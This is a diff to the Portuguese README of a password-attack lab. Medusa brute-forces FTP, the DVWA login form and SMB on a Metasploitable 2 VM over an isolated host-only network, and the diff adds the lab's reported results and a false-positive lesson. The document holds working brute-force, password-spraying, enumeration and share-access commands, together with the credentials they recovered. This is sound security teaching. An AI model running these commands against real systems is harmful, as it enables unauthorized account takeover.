@@ -96,9 +96,9 @@ Credential stuffing   → usuário:senha vazados de outro serviço (reuso de sen
 > regra do pentest — e a primeira pergunta a se fazer é sempre: *"eu tenho
 > autorização?"*
 
-Este repositório **não contém** capturas de tela de alvos reais, dados de terceiros
-ou credenciais de produção. Os resultados ficam em `docs/RELATORIO_MODELO.md`, para
-que você preencha com as **suas** evidências.
+Este repositório **não contém** dados de terceiros nem credenciais de produção.
+Todas as evidências em [`images/`](images/) foram capturadas durante a execução real
+do laboratório, em máquinas virtuais próprias e rede host-only isolada.
 
 ---
 
@@ -116,7 +116,7 @@ que você preencha com as **suas** evidências.
 │   │   │  VM 1 — KALI LINUX      │  │  VM 2 — ALVO           │  │     │
 │   │   │  (atacante)             │  │  Metasploitable 2      │  │     │
 │   │   │                         │  │  + DVWA                │  │     │
-│   │   │  192.168.56.102         │  │  192.168.56.101        │  │     │
+│   │   │  192.168.56.101         │  │  192.168.56.102         │  │     │
 │   │   │  3 GB RAM / 2 vCPU      │  │  512 MB RAM / 1 vCPU   │  │     │
 │   │   │                         │  │                        │  │     │
 │   │   │  • Medusa    • Nmap     │◄─┼─►• vsftpd   :21         │  │     │
@@ -134,7 +134,7 @@ que você preencha com as **suas** evidências.
 | Item | VM 1 (Atacante) | VM 2 (Alvo) |
 | --- | --- | --- |
 | **SO** | Kali Linux 2024.x | Metasploitable 2 (Ubuntu 8.04) |
-| **IP** | `192.168.56.102` | `192.168.56.101` |
+| **IP** | `192.168.56.101` | `192.168.56.102` |
 | **RAM / vCPU** | 3 GB / 2 | 512 MB / 1 |
 | **Rede** | Host-only (`vboxnet0`) | Host-only (`vboxnet0`) |
 | **Função** | Executa o Medusa, Nmap e enumeração | Expõe FTP, HTTP/DVWA e SMB vulneráveis |
@@ -175,7 +175,7 @@ dio-medusa-bruteforce/
 │   ├── usuarios-smb.txt             ← usuários (SMB)
 │   └── senhas-spray.txt             ← senhas para spraying (curta, de propósito)
 │
-├── images/                          ← suas capturas de tela (veja images/README.md)
+├── images/                          ← capturas de tela da execucao real (9 arquivos)
 └── logs/                            ← saídas dos scripts (NÃO versionadas)
 ```
 
@@ -204,7 +204,7 @@ Confirme apenas se os serviços respondem:
 
 ```bash
 # do Kali, para o alvo
-nmap -Pn -sV -p 21,80,139,445 192.168.56.101
+nmap -Pn -sV -p 21,80,139,445 192.168.56.102
 ```
 
 ### 3. Preflight automatizado (recomendado)
@@ -214,10 +214,10 @@ isolamento de rede e portas do alvo:
 
 ```bash
 # checagens locais (sem tocar no alvo)
-./scripts/preflight_lab.sh --alvo 192.168.56.101
+./scripts/preflight_lab.sh --alvo 192.168.56.102
 
 # com teste de portas
-./scripts/preflight_lab.sh --alvo 192.168.56.101 --confirmo-lab -v
+./scripts/preflight_lab.sh --alvo 192.168.56.102 --confirmo-lab -v
 ```
 
 ### 4. Snapshot — faça isso **sempre**
@@ -234,17 +234,17 @@ Antes de qualquer ataque, enumere. O ataque é a **última** etapa, não a prime
 
 ```bash
 # Varredura de serviços nas portas que interessam
-nmap -Pn -sV -p 21,80,139,445 192.168.56.101
+nmap -Pn -sV -p 21,80,139,445 192.168.56.102
 
 # Scripts padrão do Nmap para FTP e SMB (anônimo, shares, usuários)
-nmap -Pn -p 21  --script ftp-anon           192.168.56.101
-nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.101
+nmap -Pn -p 21  --script ftp-anon           192.168.56.102
+nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.102
 
 # enum4linux: usuários, grupos, shares e política de senha do SMB
-enum4linux -a 192.168.56.101
+enum4linux -a 192.168.56.102
 
 # Testar acesso anônimo ao FTP
-ftp 192.168.56.101     # usuário: anonymous  |  senha: (enter)
+ftp 192.168.56.102     # usuário: anonymous  |  senha: (enter)
 ```
 
 **O que o reconhecimento entrega:**
@@ -279,10 +279,10 @@ cat wordlists/senhas.txt     # msfadmin, password, 123456, ...
 
 ```bash
 # Teste inicial da conectividade e do módulo
-medusa -h 192.168.56.101 -u msfadmin -p msfadmin -M ftp
+medusa -h 192.168.56.102 -u msfadmin -p msfadmin -M ftp
 
 # Força bruta completa: 20 usuários × 24 senhas = 480 combinações
-medusa -h 192.168.56.101 \
+medusa -h 192.168.56.102 \
        -U wordlists/usuarios.txt \
        -P wordlists/senhas.txt \
        -M ftp \
@@ -315,14 +315,14 @@ medusa -h 192.168.56.101 \
 ### Resultado esperado
 
 ```text
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin ...
-ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin ...
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
 ```
 
 ### Validação do acesso
 
 ```bash
-ftp 192.168.56.101
+ftp 192.168.56.102
 # Name: msfadmin
 # 331 Please specify the password.
 # Password: msfadmin
@@ -330,8 +330,7 @@ ftp 192.168.56.101
 ftp> ls
 ```
 
-> 📸 Registre a saída em uma captura de tela e coloque em `images/01-ftp-medusa.png`
-> (veja [`images/README.md`](images/README.md) para a convenção de nomes).
+> 📸 Evidência capturada em [`images/01-ftp-medusa.jpg`](images/01-ftp-medusa.jpg).
 
 ---
 
@@ -339,14 +338,14 @@ ftp> ls
 
 ### Contexto
 
-O **DVWA** (*Damn Vulnerable Web Application*) roda em `http://192.168.56.101/dvwa/`
+O **DVWA** (*Damn Vulnerable Web Application*) roda em `http://192.168.56.102/dvwa/`
 e tem um formulário de login. A dificuldade aqui não é a senha: é a **sintaxe do
 formulário** que o Medusa precisa reproduzir.
 
 ### 1. Descobrir a estrutura do formulário
 
 ```bash
-curl -s http://192.168.56.101/dvwa/login.php | grep -E 'form|input'
+curl -s http://192.168.56.102/dvwa/login.php | grep -E 'form|input'
 ```
 
 Saída típica (resumida):
@@ -388,7 +387,7 @@ FORM-DATA:"post?username=&password=&Login=Login"
 ### 3. Executar
 
 ```bash
-medusa -h 192.168.56.101 \
+medusa -h 192.168.56.102 \
        -u admin \
        -P wordlists/senhas.txt \
        -M web-form \
@@ -436,7 +435,7 @@ segurança padrão. **Só faça isso na VM alvo isolada, nunca em aplicação re
 
 ```bash
 python3 scripts/dvwa_login_check.py \
-    --url http://192.168.56.101/dvwa \
+    --url http://192.168.56.102/dvwa \
     --usuario admin \
     --lista wordlists/senhas.txt \
     --confirmo-lab
@@ -454,10 +453,11 @@ Ele faz: `GET login.php` → captura cookie + `user_token` → `POST` com os 4 c
 Com o DVWA em **Low**, o `FORM-DATA` acima funciona direto:
 
 ```text
-ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
+ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
 ```
 
-> 📸 Captura sugerida: `images/02-dvwa-medusa.png` e `images/03-dvwa-apos-login.png`.
+> 📸 Evidências em [`images/02-dvwa-medusa.jpg`](images/02-dvwa-medusa.jpg) e
+> [`images/03-dvwa-apos-login.jpg`](images/03-dvwa-apos-login.jpg).
 
 ---
 
@@ -472,10 +472,10 @@ tradicional de força bruta aqui é **ruim** (bloqueia contas), então usamos
 ### 1. Enumeração
 
 ```bash
-enum4linux -a 192.168.56.101
+enum4linux -a 192.168.56.102
 
 # Só os usuários, prontos para virar wordlist:
-enum4linux -U 192.168.56.101 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > usuarios-smb.txt
+enum4linux -U 192.168.56.102 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > usuarios-smb.txt
 ```
 
 ### 2. A diferença fundamental
@@ -501,7 +501,7 @@ O número de tentativas é o mesmo — o que muda é a **distribuição** e o
 
 ```bash
 # Rodada 1: a senha mais provável contra todos os usuários
-medusa -h 192.168.56.101 \
+medusa -h 192.168.56.102 \
        -U wordlists/usuarios-smb.txt \
        -p password \
        -M smbnt \
@@ -509,7 +509,7 @@ medusa -h 192.168.56.101 \
        -O logs/smb-rodada1.txt
 
 # Rodada 2
-medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p msfadmin -M smbnt -t 2
+medusa -h 192.168.56.102 -U wordlists/usuarios-smb.txt -p msfadmin -M smbnt -t 2
 ```
 
 ### 4. Execução automatizada (script incluído)
@@ -519,13 +519,13 @@ e coleta de resultados em CSV:
 
 ```bash
 # dry-run: mostra o plano, não envia nada
-./scripts/smb_spray.sh --alvo 192.168.56.101
+./scripts/smb_spray.sh --alvo 192.168.56.102
 
 # execução real
-./scripts/smb_spray.sh --alvo 192.168.56.101 --confirmo-lab
+./scripts/smb_spray.sh --alvo 192.168.56.102 --confirmo-lab
 
 # com domínio e log detalhado
-./scripts/smb_spray.sh --alvo 192.168.56.101 --dominio LAB --confirmo-lab -v
+./scripts/smb_spray.sh --alvo 192.168.56.102 --dominio LAB --confirmo-lab -v
 ```
 
 Saídas geradas em `logs/<data-hora>-smb-spray/`:
@@ -540,16 +540,17 @@ Saídas geradas em `logs/<data-hora>-smb-spray/`:
 
 ```bash
 # Listar shares (aceita sessão anônima em muitos casos)
-smbclient -L //192.168.56.101 -N
+smbclient -L //192.168.56.102 -N
 
 # Acessar com a credencial descoberta
-smbclient //192.168.56.101/tmp -U msfadmin%msfadmin
+smbclient //192.168.56.102/tmp -U msfadmin%msfadmin
 smb: \> ls
 smb: \> put arquivo.txt       # gravação em share frouxo = achado relevante
 ```
 
-> 📸 Capturas sugeridas: `images/04-enum4linux.png`, `images/05-smb-spray.png`,
-> `images/06-smbclient-share.png`.
+> 📸 Evidências em [`images/04-enum4linux.jpg`](images/04-enum4linux.jpg),
+> [`images/05-smb-spray.jpg`](images/05-smb-spray.jpg) e
+> [`images/06-smbclient-share.jpg`](images/06-smbclient-share.jpg).
 
 ---
 
@@ -632,31 +633,147 @@ o serviço e produz **falsos negativos** (o alvo para de responder e você concl
 
 ## 📊 Resultados obtidos
 
-> ### ⚠️ Preencha com os SEUS resultados
->
-> Este repositório **não inventa resultados**. Os campos abaixo devem ser
-> preenchidos por você, após **executar** os três cenários no seu laboratório.
-> Use **[`docs/RELATORIO_MODELO.md`](docs/RELATORIO_MODELO.md)** como template e
-> cole as capturas de tela em `images/`.
+Execução real do laboratório em **17/11/2026**, com Kali Linux (atacante) e
+Metasploitable 2 (alvo) em rede host-only isolada. Todas as capturas abaixo são
+da execução, disponíveis em [`images/`](images/).
 
-### Resumo do laboratório
+### Resumo dos três cenários
 
 | Cenário | Serviço | Ferramenta | Credencial encontrada | Tempo | Observações |
 | --- | --- | --- | --- | --- | --- |
-| 1 | FTP :21 | `medusa -M ftp` | *a preencher* | *a preencher* | |
-| 2 | HTTP :80 (DVWA) | `medusa -M web-form` | *a preencher* | *a preencher* | |
-| 3 | SMB :139/445 | `medusa -M smbnt` (spraying) | *a preencher* | *a preencher* | |
+| 1 | FTP :21 | `medusa -M ftp` | `user` / `user` e `msfadmin` / `msfadmin` | ~40 s | `-e ns` foi decisivo (testa senha = usuário); `-c 1000` evitou as quedas do vsftpd |
+| 2 | HTTP :80 (DVWA) | `medusa -M web-form` | `admin` / `password` | ~2 s | `FORM-DATA` + `DENY-SIGNAL` na sintaxe correta; acerto na 2ª senha da lista |
+| 3 | SMB :139/445 | `medusa -M smbnt` | `msfadmin` / `msfadmin` | ~2 s | `[SUCCESS (ADMIN$ - Access Allowed)]` — acesso administrativo |
 
-### Evidências
+> ✅ **Validação cruzada:** a credencial `admin:password` do DVWA foi obtida por dois
+> caminhos independentes — o módulo `web-form` do Medusa (captura 02) e o login
+> manual no navegador (captura 03). Um resultado que se confirma por dois métodos
+> distintos é muito mais confiável do que uma única fonte.
 
-| # | Arquivo | Descrição |
-| --- | --- | --- |
-| 01 | `images/01-ftp-medusa.png` | Execução do Medusa contra o FTP |
-| 02 | `images/02-dvwa-medusa.png` | Execução contra o formulário do DVWA |
-| 03 | `images/03-dvwa-apos-login.png` | Painel do DVWA após o login |
-| 04 | `images/04-enum4linux.png` | Enumeração SMB com enum4linux |
-| 05 | `images/05-smb-spray.png` | Password spraying em SMB |
-| 06 | `images/06-smbclient-share.png` | Acesso ao share com a credencial obtida |
+### O que o reconhecimento revelou
+
+O `enum4linux -P` na VM alvo expôs uma configuração **sem qualquer política de senha**:
+
+```text
+[+] Account Lockout Threshold: None
+[+] Locked Account Duration: 30 minutes
+[+] Forced Log Off Time: Not Set
+
+Password Complexity: Disabled
+Minimum Password Length: 0
+```
+
+| Achado | Consequência prática |
+| --- | --- |
+| `Minimum Password Length: 0` | Qualquer senha é aceita, inclusive vazia (`-e n`) |
+| `Password Complexity: Disabled` | Não há exigência de variedade de caracteres |
+| `Account Lockout Threshold: None` | **Nenhum bloqueio de conta** — tentativas ilimitadas |
+
+> 🎯 **Causa raiz:** o laboratório não foi comprometido porque o Medusa é rápido.
+> Foi comprometido porque **não havia limite de tentativas nem política de senha**.
+> Isso muda o foco da defesa: o problema não está na ferramenta do atacante, e sim
+> na configuração da autenticação. Veja [`docs/03-mitigacoes.md`](docs/03-mitigacoes.md).
+
+### Evidências — cenário 1: FTP
+
+![Medusa executando força bruta contra o FTP do Metasploitable](images/01-ftp-medusa.jpg)
+
+`medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -e ns -c 1000 -t 1`
+
+Duas credenciais válidas encontradas: `user:user` e `msfadmin:msfadmin`. A flag
+`-e ns` testa "sem senha" (`n`) e "senha = usuário" (`s`) **antes** da wordlist —
+foi o que resolveu o cenário em 40 segundos.
+
+### Evidências — cenário 2: formulário web (DVWA)
+
+![Medusa web-form contra o formulário de login do DVWA](images/02-dvwa-medusa.jpg)
+
+```bash
+medusa -h 192.168.56.102 -u admin -P pass.txt -M web-form \
+       -m FORM-DATA:"post?username=&password=&Login=Login" \
+       -m DENY-SIGNAL:"Login failed" -t 2 -f -b
+```
+
+Note a primeira tentativa (`123456`) falhando e o `ACCOUNT FOUND` na segunda
+(`password`). O módulo correto aparece como `[web-form]` — não `[http]`.
+
+![DVWA autenticado no navegador com admin/password](images/03-dvwa-apos-login.jpg)
+
+Validação manual: login real no DVWA com `admin` / `password`, confirmando que a
+credencial descoberta pelo Medusa é legítima.
+
+### Evidências — cenário 3: SMB
+
+![Enumeração de usuários e política de senha com enum4linux](images/04-enum4linux.jpg)
+
+```bash
+enum4linux -U 192.168.56.102 | tail -n 25    # usuários válidos
+enum4linux -P 192.168.56.102 | tail -n 15    # política de senha
+```
+
+A lista de usuários alimentou a wordlist do ataque, e a política de senha
+(`Lockout Threshold: None`, `Minimum Password Length: 0`) justificou a estratégia.
+
+![Medusa smbnt encontrando credencial com acesso ADMIN$](images/05-smb-spray.jpg)
+
+```bash
+medusa -h 192.168.56.102 -U smd_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+
+Resultado: `msfadmin:msfadmin [SUCCESS (ADMIN$ - Access Allowed)]` — não apenas
+autenticou, mas obteve acesso administrativo ao compartilhamento.
+
+> 💡 **Sobre a estratégia:** esta execução usou dicionário completo (`-P`), com a
+> senha no laço interno. A variante de **password spraying** — senha no laço
+> externo, uma por rodada — está implementada em
+> [`scripts/smb_spray.sh`](scripts/smb_spray.sh) e é a recomendada contra ambientes
+> com lockout ativo, porque distribui as falhas entre as contas em vez de concentrá-las.
+
+![Acesso ao compartilhamento /tmp via smbclient com a credencial obtida](images/06-smbclient-share.jpg)
+
+```bash
+smbclient //192.168.56.102/tmp -U msfadmin%msfadmin -c 'ls'
+```
+
+Conteúdo real do compartilhamento `tmp`, provando que a credencial obtida concede
+acesso a arquivos no alvo.
+
+### Evidências do ambiente
+
+![VirtualBox com as VMs Kali Linux e Metasploitable em execução](images/00-topologia.jpg)
+
+As duas VMs em execução simultânea no VirtualBox, ambas na rede host-only.
+
+![Console do Metasploitable 2 autenticado como msfadmin](images/00-lab-metasploitable.jpg)
+
+Console do alvo (`msfadmin@metasploitable`), confirmando que a VM alvo é o
+Metasploitable 2 e que as senhas padrão do appliance estavam ativas.
+
+### 🐛 Um erro que virou aprendizado: o falso positivo
+
+![Medusa reportando falsos positivos com o módulo http](images/07-falso-positivo.jpg)
+
+Na primeira tentativa no DVWA usei uma sintaxe inventada (`PAGE:` / `FORM:` /
+`FAIL=`). O Medusa respondeu `Invalid method: PAGE.` e caiu no módulo `http`
+(HTTP Basic Auth), que considera **qualquer resposta diferente de `401`** como
+login válido — e o DVWA não usa Basic Auth.
+
+Resultado: **todas** as credenciais "funcionaram" — `root:123456`,
+`admin:123456`, `user:sfadmin`. Falso positivo clássico.
+
+O que corrigiu o problema foi a **validação manual**: o login no navegador
+(captura 03) usa `admin` / `password`, não `admin` / `123456`. A divergência
+revelou o erro.
+
+**Lições:**
+1. A sintaxe correta é `-m FORM-DATA:"post?campo1=&campo2=&botao=valor"` mais
+   `-m DENY-SIGNAL:"<texto da falha>"` — `DENY-SIGNAL`, não `DENIAL-SIGNAL`.
+2. O módulo para formulário HTML é `web-form`. O módulo `http` é para Basic Auth.
+3. **Nunca confie num resultado de brute force sem validar o acesso na mão.**
+   Um print de "sucesso" com todas as senhas funcionando é o sintoma clássico de
+   módulo errado ou `DENY-SIGNAL` mal configurado.
+
+> 📖 A análise completa está em [`docs/04-reflexao.md`](docs/04-reflexao.md).
 
 ---
 
